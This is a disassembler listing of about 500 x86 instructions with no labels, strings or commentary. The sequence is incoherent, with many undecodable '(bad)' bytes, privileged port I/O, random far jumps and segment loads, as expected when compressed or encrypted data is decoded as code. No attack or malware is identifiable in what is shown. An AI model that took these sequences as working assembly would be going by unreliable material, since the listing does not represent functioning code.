  435620:	mov    ebx,0x48faf554
  435625:	mov    esi,0x436e92d0
  43562a:	lea    esp,[esp+ebp*4-0x25e497c2]
  435631:	mov    ds:0x96901a81,eax
  435636:	pop    esi
  435637:	mov    eax,0xab50b98
  43563c:	mov    BYTE PTR [ebx+0x11],cl
  43563f:	(bad)  
  435640:	test   eax,0xe140de1e
  435645:	mov    cl,0x32
  435647:	and    BYTE PTR [eax-0x16],ah
  43564a:	inc    eax
  43564b:	ret    0xdad6
  43564e:	mov    eax,ds:0x6a8293e8
  435653:	jno    0x43568a
  435655:	cwde   
  435656:	sbb    eax,0x20acc6b6
  43565b:	push   0x0
  43565d:	ror    DWORD PTR [ecx-0x62],0x7b
  435661:	fdivr  DWORD PTR [ebp+edx*2+0x1088a034]
  435668:	push   ss
  435669:	push   ss
  43566a:	mov    ds:0x6f7e000b,al
  43566f:	sbb    eax,eax
  435671:	pop    ss
  435672:	hlt    
  435673:	add    al,BYTE PTR [esp+eiz*4+0xf5ae02]
  43567a:	mov    eax,ds:0xfe52e5d8
  43567f:	mov    ebx,0x86e63a0d
  435684:	push   esp
  435685:	mov    al,ds:0x40a79698
  43568a:	sub    BYTE PTR [ebp-0x13],al
  43568d:	rol    eax,1
  43568f:	xchg   BYTE PTR [esp],cl
  435692:	ret    
  435693:	call   0x6bee8975
  435698:	mov    ah,0x22
  43569a:	sbb    DWORD PTR [esi-0x1e],esi
  43569d:	add    al,0x6b
  43569f:	cmp    BYTE PTR [ebx+eiz*4+0x4a34ad39],dh
  4356a6:	sbb    al,0x6b
  4356a8:	or     al,0x3
  4356aa:	jmp    0x4356b8
  4356ac:	popa   
  4356ad:	sti    
  4356ae:	xor    BYTE PTR [edx-0x2ef76b3d],dl
  4356b4:	shl    al,1
  4356b6:	xor    dh,0x5e
  4356b9:	sbb    BYTE PTR [eax+0x25],0x30
  4356bd:	imul   ebx,DWORD PTR [eax+eax*1],0xc66192d1
  4356c4:	and    al,BYTE PTR [edi-0x4175ffab]
  4356ca:	es push edx
  4356cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4356cd:	ins    DWORD PTR es:[edi],dx
  4356ce:	test   DWORD PTR [eax],edx
  4356d0:	push   ds
  4356d1:	in     al,dx
  4356d2:	pusha  
  4356d3:	(bad)  
  4356d4:	out    dx,al
  4356d5:	sahf   
  4356d6:	mov    eax,0xd0ea455
  4356db:	pop    edx
  4356dc:	sbb    DWORD PTR [ebp+ebp*8+0x4b4ba4b1],edx
  4356e3:	sub    bl,BYTE PTR [ebx+0x19b08136]
  4356e9:	sub    DWORD PTR [edx],ebx
  4356eb:	xor    al,0x42
  4356ed:	mov    ah,0xa0
  4356ef:	mov    al,0x6c
  4356f1:	xor    eax,DWORD PTR [ebp+0x4a8d80e]
  4356f7:	mov    al,0x1d
  4356f9:	pop    ebx
  4356fa:	test   al,0x60
  4356fc:	cwde   
  4356fd:	mov    esp,0x7ce282e6
  435702:	bound  eax,QWORD PTR [ebx]
  435704:	mov    al,0x12
  435706:	cmp    BYTE PTR [eax-0x2fe85a99],ah
  43570c:	sbb    bl,BYTE PTR [edx-0x31088384]
  435712:	cld    
  435713:	sub    BYTE PTR [ebx-0x54],cl
  435716:	push   eax
  435717:	add    dh,BYTE PTR [ebx]
  435719:	push   ebx
  43571a:	mov    eax,ds:0xcb6cafa
  43571f:	sbb    BYTE PTR [edi-0x4f47bd53],bh
  435725:	sub    BYTE PTR [edx+0x532ad7c0],bh
  43572b:	lock inc esi
  43572d:	push   esp
  43572e:	lock dec esi
  435730:	shr    DWORD PTR [eax+0x255680eb],0xe3
  435737:	or     al,BYTE PTR [edx+0x22]
  43573a:	xor    BYTE PTR [ebp-0x3ef5f24b],0x94
  435741:	sbb    bh,dh
  435743:	inc    ecx
  435744:	xchg   BYTE PTR [esi+0xf122355],cl
  43574a:	add    DWORD PTR [edx+ebx*2],ecx
  43574d:	push   ebx
  43574e:	mov    eax,0xa2ff354c
  435753:	pop    ds
  435754:	stos   BYTE PTR es:[edi],al
  435755:	js     0x435727
  435757:	add    BYTE PTR [ebx-0x222cffc9],ch
  43575d:	push   es
  43575e:	pop    ebx
  43575f:	pop    edx
  435760:	shr    BYTE PTR [esi],1
  435762:	(bad)  
  435763:	inc    esi
  435764:	mov    fs,WORD PTR [edi-0x7c]
  435767:	fist   WORD PTR [edi]
  435769:	adc    BYTE PTR [ebp+esi*1+0x4ae1963c],dh
  435770:	retf   
  435771:	jl     0x435741
  435773:	adc    ebp,DWORD PTR [ecx-0x59c515ad]
  435779:	test   BYTE PTR [eax+0x590d8e35],al
  43577f:	mov    BYTE PTR [edx+0x1e5e3003],0xdc
  435786:	outs   dx,BYTE PTR ds:[esi]
  435787:	outs   dx,DWORD PTR ds:[esi]
  435788:	mov    ch,0x55
  43578a:	imul   al
  43578c:	ret    0x5efe
  43578f:	jle    0x435740
  435791:	sub    eax,0x49a8ac8e
  435796:	add    eax,0x2c084a54
  43579b:	push   cs
  43579c:	or     eax,0x240e0a14
  4357a1:	and    DWORD PTR es:[esi],esp
  4357a4:	pop    esi
  4357a5:	cmp    ebx,DWORD PTR [esi-0x4ba567b0]
  4357ab:	jo     0x435763
  4357ad:	stos   BYTE PTR es:[edi],al
  4357ae:	mov    fs,WORD PTR [ecx-0x32591721]
  4357b4:	and    dh,BYTE PTR [edi]
  4357b6:	ss ja  0x43581a
  4357b9:	fisub  DWORD PTR [esp+eiz*4+0x191758e2]
  4357c0:	cmp    bl,dl
  4357c2:	stos   BYTE PTR es:[edi],al
  4357c3:	xchg   edx,eax
  4357c4:	aad    0x6
  4357c6:	neg    esp
  4357c8:	push   edi
  4357c9:	push   edi
  4357ca:	rol    DWORD PTR [ebx+0x3f0bbcf4],1
  4357d0:	mov    esp,es
  4357d2:	stos   BYTE PTR es:[edi],al
  4357d3:	xor    BYTE PTR [edx+0x5a],bh
  4357d6:	stos   DWORD PTR es:[edi],eax
  4357d7:	test   al,0x78
  4357d9:	xchg   edx,eax
  4357da:	ret    
  4357db:	add    BYTE PTR ds:0x42642a76,bl
  4357e1:	cmp    al,BYTE PTR [ecx-0x48bbb58a]
  4357e7:	add    eax,0x1f9ec8a5
  4357ec:	loopne 0x4357f5
  4357ee:	mov    WORD PTR [edi],es
  4357f0:	fisubr WORD PTR [esi+ebx*4-0x7e03a86a]
  4357f7:	push   esi
  4357f8:	cmc    
  4357f9:	ins    DWORD PTR es:[edi],dx
  4357fa:	int3   
  4357fb:	dec    ecx
  4357fc:	dec    eax
  4357fd:	retf   0xbcbe
  435800:	inc    esp
  435801:	adc    esp,DWORD PTR ds:0xb8721817
  435807:	add    dl,BYTE PTR [ebx]
  435809:	mov    ds,WORD PTR [edi]
  43580b:	nop
  43580c:	fld    DWORD PTR [ebx-0x52]
  43580f:	inc    esi
  435810:	add    BYTE PTR [esi+0x2a168280],ch
  435816:	push   eax
  435817:	dec    edx
  435818:	sbb    BYTE PTR [esi+0x18],bl
  43581b:	pop    eax
  43581c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43581d:	ss mov esp,0x9728dbe7
  435823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435824:	mov    cl,0xa9
  435826:	pop    edi
  435827:	push   ss
  435828:	sub    dl,0x26
  43582b:	int3   
  43582c:	push   eax
  43582d:	sti    
  43582e:	sub    ecx,esp
  435830:	aam    0xce
  435832:	or     BYTE PTR [edx+edi*2+0x1a04d10],al
  435839:	test   cl,0x22
  43583c:	fst    QWORD PTR [eax]
  43583e:	sub    BYTE PTR [esi+0x6d],cl
  435841:	xchg   ebx,eax
  435842:	js     0x435864
  435844:	mov    al,ds:0xa5c8178a
  435849:	rcl    DWORD PTR [edi+0x0],0x16
  43584d:	sbb    al,0x74
  43584f:	jb     0x4357e1
  435851:	dec    eax
  435852:	xchg   ecx,eax
  435853:	ss push es
  435855:	mov    al,ds:0x320d8a55
  43585a:	sbb    BYTE PTR [esi],0x1c
  43585d:	pop    edx
  43585e:	and    DWORD PTR [ebp+0xb],0x781f081e
  435865:	jb     0x4358d5
  435867:	push   edx
  435868:	lea    eax,[edx+edx*8-0x4db7ffcc]
  43586f:	popf   
  435870:	mov    dh,0x55
  435872:	retf   0x9ab3
  435875:	sub    DWORD PTR ds:0x522ca0f1,esi
  43587b:	or     DWORD PTR [eax],edx
  43587d:	adc    al,BYTE PTR [eax+esi*4-0x1]
  435881:	xor    cl,BYTE PTR [ebp+0x10]
  435884:	ins    BYTE PTR es:[edi],dx
  435885:	adc    ecx,DWORD PTR [esi+eax*2]
  435888:	xchg   esi,eax
  435889:	pop    esp
  43588a:	mov    eax,0x1b12590
  43588f:	ds push ebx
  435891:	lods   al,BYTE PTR ds:[esi]
  435892:	dec    edi
  435893:	xchg   edx,eax
  435894:	gs sub eax,0xbc70aa84
  43589a:	mov    ds:0x6063346a,al
  43589f:	inc    esi
  4358a0:	(bad)
  4358a3:	mov    eax,ds:0xdad92698
  4358a8:	aad    0xb2
  4358aa:	pop    esi
  4358ab:	enter  0xdad,0x7
  4358af:	and    bl,BYTE PTR [esi]
  4358b1:	scas   al,BYTE PTR es:[edi]
  4358b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4358b3:	popw   ss
  4358b5:	ficom  DWORD PTR [eax+0x61]
  4358b8:	scas   eax,DWORD PTR es:[edi]
  4358b9:	push   cs
  4358ba:	popa   
  4358bb:	push   ebp
  4358bc:	adc    BYTE PTR [esi],ch
  4358be:	cwde   
  4358bf:	cmp    BYTE PTR [ebx],dl
  4358c1:	je     0x435887
  4358c3:	add    esi,ebp
  4358c5:	inc    eax
  4358c6:	fadd   DWORD PTR [edx]
  4358c8:	std    
  4358c9:	mov    esi,0x9b11c4a8
  4358ce:	(bad)  
  4358d0:	retf   0x751a
  4358d3:	(bad)  
  4358d4:	in     al,dx
  4358d5:	adc    esi,DWORD PTR [ecx+0x1c3efe1a]
  4358db:	mov    BYTE PTR [ebx-0x72],al
  4358de:	jl     0x43592b
  4358e0:	adc    DWORD PTR ds:0x328d4012,ebx
  4358e6:	pop    es
  4358e7:	cmc    
  4358e8:	xchg   ecx,eax
  4358e9:	ret    0x767a
  4358ec:	xchg   esi,eax
  4358ed:	mov    es,WORD PTR [eax+0x2782d638]
  4358f3:	jmp    0x2ea8:0x9866366f
  4358fa:	xchg   esp,eax
  4358fb:	sub    eax,0xe410edb5
  435900:	mov    ecx,0xee4f47dc
  435905:	outs   dx,BYTE PTR ds:[esi]
  435906:	pop    esi
  435907:	adc    BYTE PTR [eax+0x7f],ch
  43590a:	call   0xc944429f
  43590f:	fst    QWORD PTR [eax]
  435911:	push   esi
  435912:	and    BYTE PTR [edi-0x3f7669af],ch
  435918:	pop    ss
  435919:	mov    ah,0xcf
  43591b:	mov    WORD PTR [eax-0x7f],fs
  43591e:	mov    ds:0x7c73c048,al
  435923:	or     al,0x62
  435925:	dec    edx
  435926:	test   al,0xb6
  435928:	je     0x43598e
  43592a:	into   
  43592b:	lahf   
  43592c:	out    0x5a,al
  43592e:	mov    ah,0xa8
  435930:	jge    0x435985
  435932:	cld    
  435933:	je     0x43595d
  435935:	jno    0x43599f
  435937:	adc    BYTE PTR [eax+0x78],dl
  43593a:	or     ebp,edi
  43593c:	sub    al,0x2b
  43593f:	jle    0x43591f
  435941:	add    DWORD PTR [edx+ebx*4],esp
  435944:	ds push ebx
  435946:	sub    dh,al
  435948:	adc    edx,esi
  43594a:	mov    al,ds:0x2c096472
  43594f:	push   es
  435950:	mov    cl,0x80
  435952:	outs   dx,BYTE PTR ds:[esi]
  435953:	add    al,0xda
  435955:	mov    DWORD PTR cs:[edi-0x51],esp
  435959:	add    BYTE PTR [edx-0x4a],bl
  43595c:	sbb    BYTE PTR [edx+0x45f510b8],0xea
  435963:	mov    ds:0xb45c1904,eax
  435968:	or     dl,BYTE PTR [eax+edx*2+0xbc8d450]
  43596f:	mov    dh,0x8c
  435971:	push   es
  435972:	jg     0x435939
  435974:	mov    ds:0x323e28ce,al
  435979:	sar    BYTE PTR [esp+ecx*1+0x5981686],cl
  435980:	jle    0x43595b
  435982:	push   ss
  435983:	jmp    0x7524:0x6ac90682
  43598a:	lock out dx,al
  43598c:	inc    edx
  43598d:	push   ds
  43598e:	dec    edx
  43598f:	sub    al,BYTE PTR [edx+0x6a5ae4ce]
  435995:	retf   0x4d21
  435998:	jmp    0x5e202a44
  43599d:	add    al,BYTE PTR [ecx+0x66530c2]
  4359a3:	jno    0x435953
  4359a5:	cmp    esp,esp
  4359a7:	add    BYTE PTR [esi-0x37],bl
  4359aa:	sub    dh,BYTE PTR [edx-0x7d]
  4359ad:	cmp    ch,BYTE PTR [ecx+0x43]
  4359b0:	pusha  
  4359b1:	pop    ebx
  4359b2:	mov    bl,0x87
  4359b4:	cmp    ah,BYTE PTR [ebx+0x6b2e9ad4]
  4359ba:	mov    esi,0x2e521ac5
  4359bf:	add    eax,0xa2360525
  4359c4:	inc    esp
  4359c5:	mov    bh,bl
  4359c7:	test   dl,bl
  4359c9:	mov    edi,0xe426049c
  4359ce:	je     0xa814b48f
  4359d4:	mov    ss,WORD PTR [edx]
  4359d6:	push   cs
  4359d7:	cmp    al,BYTE PTR gs:[esi-0x4a]
  4359db:	mov    edx,0x2f82a89c
  4359e0:	dec    eax
  4359e1:	mov    BYTE PTR [eax+eax*8],0x5
  4359e5:	in     eax,dx
  4359e6:	push   eax
  4359e7:	inc    esp
  4359e8:	xor    ebx,edx
  4359ea:	out    0x4,eax
  4359ec:	loope  0x4359f2
  4359ee:	pop    ecx
  4359ef:	adc    al,0x9a
  4359f1:	sbb    eax,0xeafc12aa
  4359f6:	xchg   esi,eax
  4359f7:	fbstp  TBYTE PTR [esi]
  4359f9:	ins    DWORD PTR es:[edi],dx
  4359fa:	adc    edx,DWORD PTR [ebx]
  4359fc:	pop    ds
  4359fd:	test   al,0xa2
  4359ff:	adc    al,0x76
  435a01:	mov    edi,0xe3e204aa
  435a06:	add    BYTE PTR [ebx+0x59],al
  435a09:	push   eax
  435a0a:	push   0xffffffa1
  435a0c:	gs test eax,0xe59ca0a2
  435a12:	and    al,0x5c
  435a14:	(bad)  
  435a15:	xchg   BYTE PTR [ecx],al
  435a17:	lea    edx,ds:0x40a67656
  435a1d:	out    dx,al
  435a1e:	stos   DWORD PTR es:[edi],eax
  435a1f:	and    DWORD PTR [eax-0x63],esi
  435a22:	inc    eax
  435a23:	xchg   ebx,eax
  435a24:	call   0x884bede4
  435a29:	push   ebx
  435a2a:	xchg   esi,eax
  435a2b:	dec    eax
  435a2c:	cmp    DWORD PTR [ebx+eax*2-0x290fe9b7],eax
  435a33:	or     bl,dl
  435a35:	mov    ds:0x8502c877,al
  435a3a:	add    cl,dh
  435a3c:	outs   dx,BYTE PTR ds:[esi]
  435a3d:	cmp    bh,al
  435a3f:	xchg   esp,eax
  435a40:	cmovb  edi,DWORD PTR [edi-0x7db84a65]
  435a47:	xchg   esi,eax
  435a48:	ja     0x435a4c
  435a4a:	jl     0x435a48
  435a4c:	pop    eax
  435a4d:	sub    bl,ah
  435a4f:	or     ah,BYTE PTR ds:[ebp+0x72385023]
  435a56:	or     al,dl
  435a58:	inc    ebp
  435a59:	inc    ebx
  435a5a:	repz sub ebp,esi
  435a5d:	mov    bh,0x0
  435a5f:	cwde   
  435a60:	cli    
  435a61:	add    BYTE PTR [esi],cl
  435a63:	push   esi
  435a64:	or     al,dl
  435a66:	jbe    0x435a40
  435a68:	cmp    BYTE PTR [eax],cl
  435a6a:	pop    ebx
  435a6b:	or     ecx,DWORD PTR [edx]
  435a6d:	or     eax,0x869966a7
  435a72:	sbb    edi,DWORD PTR [edx+0x12]
  435a75:	jl     0x435a2b
  435a77:	je     0x435aa2
  435a79:	test   eax,0x701a9d3c
  435a7e:	and    al,0x78
  435a80:	mov    ebp,DWORD PTR [eax-0x1945148e]
  435a86:	inc    ebp
  435a87:	pop    ebp
  435a88:	ret    0xd833
  435a8b:	jl     0x435a77
  435a8d:	mov    ebx,0xfb025614
  435a92:	and    eax,DWORD PTR [ecx]
  435a94:	xor    DWORD PTR cs:[ecx+0x6ac90700],ecx
  435a9b:	mov    ah,0xd6
  435a9d:	fs je  0x435a54
  435aa0:	pop    ecx
  435aa1:	and    dl,dh
  435aa3:	test   al,0xaf
  435aa5:	or     al,0x29
  435aa7:	cli    
  435aa8:	sbb    ah,al
  435aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435aab:	mov    ebp,esp
  435aad:	scas   al,BYTE PTR es:[edi]
  435aae:	add    eax,0xddf5f05
  435ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435ab4:	int3   
  435ab5:	xchg   edx,eax
  435ab6:	aam    0xba
  435ab8:	mov    bl,0x8d
  435aba:	lods   eax,DWORD PTR ds:[esi]
  435abb:	add    DWORD PTR [ebp+0x3fbe763e],0x75ba298
  435ac5:	loop   0x435b1d
  435ac7:	cld    
  435ac8:	push   0x51004078
  435acd:	add    DWORD PTR [ecx+0x726cdb0a],esp
  435ad3:	mov    al,ds:0xac3b5ab2
  435ad8:	push   ds
  435ad9:	jl     0x435b34
  435adb:	out    dx,al
  435adc:	lods   al,BYTE PTR ds:[esi]
  435add:	(bad)
  435ae1:	push   ebp
  435ae2:	ins    BYTE PTR es:[edi],dx
  435ae3:	mov    ?,WORD PTR [edx+0x1ca49980]
  435ae9:	jg     0x435b5f
  435aeb:	(bad)  
  435aec:	out    0xf6,al
  435aee:	xor    DWORD PTR [esi],0x38
  435af1:	mov    edx,edi
  435af3:	pop    eax
  435af4:	add    dh,dl
  435af6:	in     al,0x1f
  435af8:	(bad)  
  435af9:	xor    eax,0x5aa4cf89
  435afe:	std    
  435aff:	xor    bl,ch
  435b01:	push   esp
  435b02:	outs   dx,DWORD PTR ds:[esi]
  435b03:	dec    ebp
  435b04:	xchg   edx,eax
  435b05:	pop    edx
  435b06:	mov    eax,0xccdcf194
  435b0b:	push   0x68
  435b0d:	add    BYTE PTR [ebx],ah
  435b0f:	js     0x435b15
  435b11:	push   esi
  435b12:	cmp    eax,0x96e41201
  435b17:	push   ebp
  435b18:	je     0x435aa6
  435b1a:	mov    esi,0x23483d09
  435b1f:	popf   
  435b20:	cmp    al,0x88
  435b22:	inc    BYTE PTR [edi]
  435b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435b25:	push   0x54
  435b27:	push   ss
  435b28:	sbb    eax,0x1025b50
  435b2d:	rcr    BYTE PTR [edx+eax*8],1
  435b30:	out    0x34,al
  435b32:	or     bh,cl
  435b34:	in     al,dx
  435b35:	adc    edi,0x937e0ed0
  435b3b:	aam    0xc8
  435b3d:	(bad)  
  435b3e:	jbe    0x435b3a
  435b40:	and    al,0xe1
  435b42:	sub    DWORD PTR [ebx+eiz*1],0xffffffca
  435b46:	aam    0xe2
  435b48:	mov    ebx,0xd0f0903a
  435b4d:	mov    al,0x29
  435b4f:	inc    ebx
  435b50:	call   0x2c28:0x6d481d9a
  435b57:	sahf   
  435b58:	mov    esp,0x7abb20f6
  435b5d:	adc    bl,dl
  435b5f:	add    edx,DWORD PTR [eax+0xc]
  435b62:	icebp  
  435b63:	inc    ebp
  435b64:	push   ss
  435b65:	dec    ebx
  435b66:	ins    BYTE PTR es:[edi],dx
  435b67:	stos   BYTE PTR es:[edi],al
  435b68:	adc    BYTE PTR [eax+0x1a],bh
  435b6b:	scas   eax,DWORD PTR es:[edi]
  435b6c:	nop
  435b6d:	data16 aam 0x65
  435b70:	xchg   BYTE PTR [edx+ebp*8+0x5],dh
  435b74:	adc    ah,BYTE PTR [eax]
  435b76:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  435b78:	shl    DWORD PTR ds:0xe743e30,1
  435b7e:	enter  0x50da,0x24
  435b82:	out    dx,al
  435b83:	(bad)  
  435b84:	test   eax,0x1d918db0
  435b89:	loopne 0x435b37
  435b8b:	in     eax,dx
  435b8c:	push   es
  435b8d:	nop
  435b8e:	dec    esp
  435b8f:	mov    edx,0xea46206a
  435b94:	push   eax
  435b95:	rcl    DWORD PTR [eax+0xc],cl
  435b98:	shl    BYTE PTR [ecx],1
  435b9a:	adc    al,0x21
  435b9c:	jp     0x435bcc
  435b9e:	test   eax,0x258e19e3
  435ba3:	xor    BYTE PTR [ebp+0x282ccbec],bl
  435ba9:	push   0xa236ef88
  435bae:	in     al,0x55
  435bb0:	mov    dl,0xa6
  435bb2:	xchg   BYTE PTR [esi-0x183d855a],ch
  435bb8:	outs   dx,BYTE PTR ds:[esi]
  435bb9:	add    DWORD PTR [eax-0x2],edx
  435bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435bbd:	retf   
  435bbe:	push   edx
  435bbf:	add    eax,0x1a60b384
  435bc4:	daa    
  435bc5:	test   al,0xad
  435bc7:	loope  0x435bbf
  435bc9:	inc    edi
  435bca:	loopne 0x435bf5
  435bcc:	retf   0xae7c
  435bcf:	inc    esi
  435bd0:	in     eax,dx
  435bd1:	push   0xd018da0a
  435bd6:	in     eax,0x6
  435bd8:	in     eax,dx
  435bd9:	mov    ah,cl
  435bdb:	mov    dl,BYTE PTR [ebx-0x77]
  435bde:	inc    esi
  435bdf:	mov    ebx,0xfa548c12
  435be4:	outs   dx,DWORD PTR fs:[esi]
  435be6:	jmp    0x918657e
  435beb:	enter  0x8308,0xb9
  435bef:	stos   WORD PTR es:[edi],ax
  435bf1:	mov    ch,0x43
  435bf3:	mov    cs,WORD PTR [eax]
  435bf5:	jl     0x435b82
  435bf7:	push   ss
  435bf8:	xor    bl,dh
  435bfa:	das    
  435bfb:	push   0x1d
  435bfd:	push   ebp
  435bfe:	push   es
  435bff:	add    al,0x42
  435c01:	loope  0x435c19
  435c03:	lods   al,BYTE PTR ds:[esi]
  435c04:	cmp    al,ch
  435c06:	imul   eax,DWORD PTR [eax],0x585758ee
  435c0c:	mov    al,0x46
  435c0e:	dec    edx
  435c0f:	cmp    al,0x47
  435c11:	add    BYTE PTR [edi],bh
  435c13:	inc    ebp
  435c14:	inc    ecx
  435c15:	sub    DWORD PTR [esi+0x1a],0x3f
  435c19:	rol    DWORD PTR [ebx],cl
  435c1b:	push   ds
  435c1c:	cli    
  435c1d:	add    al,0xac
  435c1f:	sbb    DWORD PTR [esi],ebx
  435c21:	imul   ebp,DWORD PTR [edi+0x4e183057],0xe
  435c28:	dec    esp
  435c29:	push   ebp
  435c2a:	lods   al,BYTE PTR ds:[esi]
  435c2b:	xchg   esi,eax
  435c2c:	call   0xc2a5:0xa02c99a1
  435c33:	mov    eax,0xa410a1ab
  435c38:	test   al,0x40
  435c3a:	cmp    DWORD PTR [edx],edi
  435c3c:	into   
  435c3d:	mov    ds:0xb8758475,al
  435c42:	xchg   edi,eax
  435c43:	push   0x286a286c
  435c48:	aam    0xca
  435c4a:	(bad)  
  435c4b:	pop    esp
  435c4c:	adc    al,0x1e
  435c4e:	stos   BYTE PTR es:[edi],al
  435c4f:	adc    BYTE PTR [esi+0x74102868],0x9c
  435c56:	xchg   ebp,eax
  435c57:	neg    BYTE PTR [edx-0x5f]
  435c5a:	mov    dh,0x4d
  435c5c:	pop    ds
  435c5d:	dec    ebp
  435c5e:	jne    0x435c78
  435c60:	push   esp
  435c61:	popf   
  435c62:	or     al,0x7a
  435c64:	lods   eax,DWORD PTR ds:[esi]
  435c65:	les    ebp,FWORD PTR [esi-0x3ff2fda]
  435c6b:	push   esp
  435c6c:	cs xchg esp,eax
  435c6e:	xchg   edx,eax
  435c6f:	push   edi
  435c70:	push   ebx
  435c71:	nop
  435c72:	nop
  435c73:	push   ecx
  435c74:	push   edi
  435c75:	in     al,0x79
  435c77:	sbb    BYTE PTR [eax],dh
  435c79:	outs   dx,DWORD PTR ds:[esi]
  435c7a:	pop    ebx
  435c7b:	xchg   DWORD PTR [esi+0x343ae5cc],ecx
  435c81:	repz (bad) 
  435c83:	mov    dh,0x0
  435c85:	jg     0x435cd1
  435c87:	pop    edx
  435c88:	je     0x435cb3
  435c8a:	lods   al,BYTE PTR ds:[esi]
  435c8b:	pop    eax
  435c8c:	inc    esi
  435c8d:	stos   DWORD PTR es:[edi],eax
  435c8e:	xchg   esi,eax
  435c8f:	pushw  0x167
  435c93:	xchg   dh,dl
  435c95:	ds ret 0x2292
  435c99:	inc    ebx
  435c9a:	mov    BYTE PTR [esi+0x1c],dl
  435c9d:	addr16 es push ds
  435ca0:	retf   0x1eda
  435ca3:	fisub  WORD PTR [esi-0x710734d3]
  435ca9:	and    DWORD PTR [edx-0x58],edi
  435cac:	xchg   DWORD PTR [edx],esi
  435cae:	rcl    BYTE PTR [ebx-0x66604729],cl
  435cb4:	inc    ecx
  435cb5:	adc    eax,0x4586927d
  435cba:	and    bh,al
  435cbc:	xchg   ebp,eax
  435cbd:	mov    ebp,0x1e0d1a2
  435cc2:	inc    esi
  435cc3:	dec    edi
  435cc4:	mov    bl,BYTE PTR [edx+0x6968f8fc]
  435cca:	push   ecx
  435ccb:	and    ebx,edx
  435ccd:	es push esi
  435ccf:	hlt    
  435cd0:	cli    
  435cd1:	pop    ebx
  435cd2:	ret    
  435cd3:	add    eax,DWORD PTR [ecx-0x58d7c7b1]
  435cd9:	rcr    bl,cl
  435cdb:	aam    0x9
  435cdd:	imul   esp,DWORD PTR [ebx+0x4486e961],0xffffffb3
  435ce4:	sub    ah,BYTE PTR [ebx-0x989365f]
  435cea:	nop
  435ceb:	das    
  435cec:	mov    al,ds:0x841a1076
  435cf1:	and    ah,BYTE PTR [ecx-0x3ab15d58]
  435cf7:	adc    ah,bh
  435cf9:	je     0x435cd5
  435cfb:	pushf  
  435cfc:	cmp    al,BYTE PTR [eax]
  435cfe:	pushf  
  435cff:	test   BYTE PTR [edi-0x5fb4c9a4],bl
  435d05:	pop    esi
  435d06:	push   ecx
  435d07:	cmp    edx,DWORD PTR [eax+esi*4-0x2c]
  435d0b:	push   cs
  435d0c:	sar    dl,0xa4
  435d0f:	ds inc ebp
  435d11:	mov    ebp,0x961405ae
  435d16:	fdivr  QWORD PTR [eax]
  435d18:	or     DWORD PTR [edx-0x3de30fda],0x6da2b49a
  435d22:	jnp    0x435d2a
  435d24:	push   ss
  435d25:	data16 loop 0x435cf2
  435d28:	mov    esi,0xaa88289f
  435d2d:	mov    dl,0xf5
  435d2f:	mov    dl,BYTE PTR [edx+0x7]
  435d32:	sbb    DWORD PTR ds:0x1b0a4a22,esi
  435d38:	imul   BYTE PTR [edx+ecx*2]
  435d3b:	adc    DWORD PTR [esi],0xa1b7d058
  435d41:	inc    edx
  435d42:	push   es
  435d43:	add    esi,edi
  435d45:	push   cs
  435d46:	mul    BYTE PTR [eax]
  435d48:	stos   DWORD PTR es:[edi],eax
  435d49:	fwait
  435d4a:	cld    
  435d4b:	fild   DWORD PTR [esi]
  435d4d:	mov    bl,0xfa
  435d4f:	mov    al,0xf0
  435d51:	pop    ecx
  435d52:	(bad)  
  435d53:	(bad)  [eax]
  435d55:	xor    BYTE PTR [edx+0x6b5c166f],cl
  435d5b:	mov    ebx,0x3a04b566
  435d60:	scas   al,BYTE PTR es:[edi]
  435d61:	retf   0xea57
  435d64:	fs jl  0x435ce8
  435d67:	cmp    DWORD PTR [edx],0xf4b88e94
  435d6d:	js     0x435cfa
  435d6f:	ret    0x6947
  435d72:	cli    
  435d73:	clc    
  435d74:	in     al,0x50
  435d76:	or     eax,0xf1b3eb48
  435d7b:	inc    BYTE PTR [edx]
  435d7d:	push   ebx
  435d7e:	jbe    0x435de0
  435d80:	xor    al,0x24
  435d82:	ds fwait
  435d84:	js     0x435d44
  435d86:	rcl    DWORD PTR [ebx-0x64],1
  435d89:	inc    esi
  435d8a:	loop   0x435dbc
  435d8c:	dec    ecx
  435d8d:	adc    BYTE PTR [edx+esi*4],bh
  435d90:	mov    ch,ch
  435d92:	sbb    BYTE PTR [eax+0x42126859],al
  435d98:	call   0x2c78:0x9aaa
  435d9e:	push   esp
  435d9f:	repnz dec esp
  435da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435da2:	xlat   BYTE PTR ds:[ebx]
  435da3:	sete   al
  435da6:	mov    dl,0x3e
  435da8:	mov    gs,ebx
  435daa:	push   0x435343a2
  435daf:	stos   DWORD PTR es:[edi],eax
  435db0:	dec    eax
  435db1:	das    
  435db2:	xor    al,0x62
  435db4:	cwde   
  435db5:	sahf   
  435db6:	mov    cs,WORD PTR [edi+0x1b681a08]
  435dbc:	pop    edx
  435dbd:	test   al,0x34
  435dbf:	cmp    eax,0xdc36218c
  435dc4:	int    0x9
  435dc6:	push   ss
  435dc7:	adc    al,0x79
  435dc9:	adc    esp,ebp
  435dcb:	or     al,0xd2
  435dcd:	imul   edi,DWORD PTR [edx+0x55150678],0x9c84d82a
  435dd7:	inc    eax
  435dd8:	pop    es
  435dd9:	(bad)  
  435dda:	and    eax,DWORD PTR [eax+0x45]
  435ddd:	xchg   edx,eax
  435dde:	add    al,BYTE PTR [eax+0x1696df3a]
  435de4:	adc    BYTE PTR [esi-0x4e],bh
  435de7:	xchg   edx,eax
  435de8:	(bad)  
  435de9:	arpl   WORD PTR [eax],ax
  435deb:	push   0x5d
  435ded:	adc    eax,0x7c0e48c4
  435df2:	push   ss
  435df3:	repnz popw ds
  435df6:	gs je  0x435e61
  435df9:	sub    al,0xce
  435dfb:	adc    eax,0x5b216ef
  435e00:	push   edi
  435e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435e02:	lea    ecx,[ebx-0x49614336]
  435e08:	jno    0x435e5e
  435e0a:	aaa    
  435e0b:	push   ds
  435e0c:	cmc    
  435e0d:	ss or  al,0xab
  435e10:	push   ebx
